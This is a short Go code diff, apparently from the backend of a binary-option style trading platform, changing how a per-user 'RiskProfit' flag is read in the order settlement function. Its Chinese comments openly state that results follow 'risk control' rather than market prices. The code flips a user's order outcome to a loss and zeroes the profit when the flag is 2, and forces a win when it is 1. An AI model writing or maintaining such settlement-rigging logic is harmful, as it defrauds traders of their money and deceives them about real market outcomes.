@@ -98,9 +98,9 @@ func UpdateResult(id string) {
 	// 根据风控来交易，不看k线图结果
 	var User response.User
 	DB.Model(models.User{}).Where("id", result.UserId).Find(&User)
-	// User.RiskProfit >= 50  根据风控来交易，不看k线图结果   ||    购买结果和实际结果一样 盈利了
+	// User.RiskProfit 风控 0-无 1-盈 2-亏  根据风控来交易，不看k线图结果   ||    购买结果和实际结果一样 盈利了
 	// 盈利：本金+（本金*盈利率）-手续费 handle_fee
-	if User.RiskProfit < 50 { // 根据风控概率直接让用户输，篡改交割结果改成和用户买的不一样
+	if User.RiskProfit == 2 { // 根据风控概率直接让用户输，篡改交割结果改成和用户买的不一样
 		if result.OrderType == Updates["order_result"] {
 			if Updates["order_result"] == "1" {
 				Updates["order_result"] = "2"
@@ -111,8 +111,8 @@ func UpdateResult(id string) {
 			Updates["result_profit"] = 0
 		}
 	} else {
-		if User.RiskProfit >= 50 || result.OrderType == Updates["order_result"] {
-			if User.RiskProfit >= 50 {
+		if User.RiskProfit == 1 || result.OrderType == Updates["order_result"] {
+			if User.RiskProfit == 1 {
 				Updates["order_result"] = "1"
 				logger.Info(fmt.Sprintf("根据风控概率赢了 User.RiskProfit : %v", User.RiskProfit))
 				logger.Info(fmt.Sprintf("风控盈利更新交割结果 : %v", Updates))
